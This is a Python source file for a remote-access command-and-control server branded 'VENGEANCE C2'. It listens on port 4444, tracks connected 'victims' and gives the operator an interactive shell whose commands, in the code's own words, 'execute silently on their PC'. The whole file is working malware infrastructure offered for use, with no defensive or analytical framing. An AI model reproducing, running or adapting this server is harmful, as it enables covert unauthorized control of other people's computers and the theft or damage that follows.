import socket
import threading
import time
import sys
import os

HOST = '0.0.0.0'
PORT = 4444

clients = {}
lock = threading.Lock()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def type_effect(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_banner():
    clear()
    banner = r"""
 ██▒   █▓▓█████  ███▄    █   ▄████ ▓█████  ███▄    █  ▄████▄  ▓█████ 
▓██░   █▒▓█   ▀  ██ ▀█   █  ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▒██▀ ▀█  ▓█   ▀ 
 ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒▓█    ▄ ▒███   
  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒▓█  ▄ 
   ▒▀█░  ░▒████▒▒██░   ▓██░░▒▓███▀▒░▒████▒▒██░   ▓██░▒ ▓███▀ ░░▒████▒
   ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░░ ▒░ ░
   ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░░ ░░   ░ ▒░  ░  ▒    ░ ░  ░
     ░░     ░      ░   ░ ░ ░ ░   ░    ░      ░   ░ ░ ░           ░   
      ░     ░  ░         ░       ░    ░  ░         ░ ░ ░         ░  ░
     ░                                               ░               
    """
    print("\033[91m" + banner + "\033[0m")
    type_effect("                  [ VENGEANCE C2 v1.0 ] - Control Panel", 0.03)

def list_victims():
    with lock:
        if not clients:
            print("\033[93mNo victims connected yet.\033[0m")
            return None
        print("\n\033[92m=== CONNECTED VICTIMS ===\033[0m")
        for i, (sock, name) in enumerate(clients.items(), 1):
            print(f"  \033[96m{i}.\033[0m {name}")
        print("\033[92m=========================\033[0m")
        return list(clients.keys())

def handle_client(client_socket, addr):
    try:
        data = client_socket.recv(1024).decode('utf-8', errors='ignore')
        name = data.split("|")[1] if "connected|" in data else f"{addr[0]}"

        with lock:
            clients[client_socket] = name

        print(f"\n\033[92m[+] VENGEANCE ACQUIRED → {name} ({addr[0]})\033[0m")
    except:
        pass

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(20)

    print("\033[92m[+] VENGEANCE C2 Server Started\033[0m")
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def victim_shell(victim_socket, victim_name):
    clear()
    print(f"\033[91m=== VENGEANCE SHELL → {victim_name} ===\033[0m")
    type_effect("You now have full control. Commands execute silently on their PC.", 0.02)
    print("Type '\033[93mback\033[0m' to return\n")

    while True:
        try:
            shell_cmd = input(f"\033[96m{victim_name}\033[0m $> ").strip()
            
            if shell_cmd.lower() == 'back':
                return
            if not shell_cmd:
                continue

            victim_socket.sendall(shell_cmd.encode('utf-8'))

            output = ""
            while True:
                chunk = victim_socket.recv(8192).decode('utf-8', errors='ignore')
                output += chunk
                if "END_OF_COMMAND" in chunk or len(chunk) < 8192:
                    break
            clean_output = output.replace("END_OF_COMMAND", "").strip()
            if clean_output:
                print(clean_output)
        except:
            print("\033[91mConnection lost.\033[0m")
            return

def main_menu():
    while True:
        try:
            cmd = input("\n\033[91mvengeance\033[0m > ").strip().lower()

            if cmd in ['list', 'victims']:
                list_victims()
                continue

            if cmd in ['clear', 'cls']:
                print_banner()
                continue

            if cmd in ['help', '?']:
                print("""\033[93m
Available Commands:
  list / victims     → Show all connected targets
  [number]           → Enter shell (type 1, 2, 3...)
  clear / cls        → Clear screen
  help               → This menu
  exit / quit        → Shutdown C2
\033[0m""")
                continue

            if cmd in ['exit', 'quit']:
                print("\033[91m[!] Shutting down VENGEANCE...\033[0m")
                sys.exit(0)

            if cmd.isdigit():
                try:
                    index = int(cmd) - 1
                    with lock:
                        victim_list = list(clients.keys())
                        if 0 <= index < len(victim_list):
                            victim_socket = victim_list[index]
                            victim_name = clients[victim_socket]
                            victim_shell(victim_socket, victim_name)
                            print_banner()
                        else:
                            print("\033[91mInvalid number.\033[0m")
                except:
                    print("\033[91mError.\033[0m")
                continue

            if cmd:
                print("\033[93mType 'help' for commands.\033[0m")

        except KeyboardInterrupt:
            print("\n\033[91m[!] Shutting down...\033[0m")
            sys.exit(0)

if __name__ == "__main__":
    print_banner()
    threading.Thread(target=start_server, daemon=True).start()
    time.sleep(1)
    print("\033[93mType 'help' to see commands.\033[0m")
    main_menu()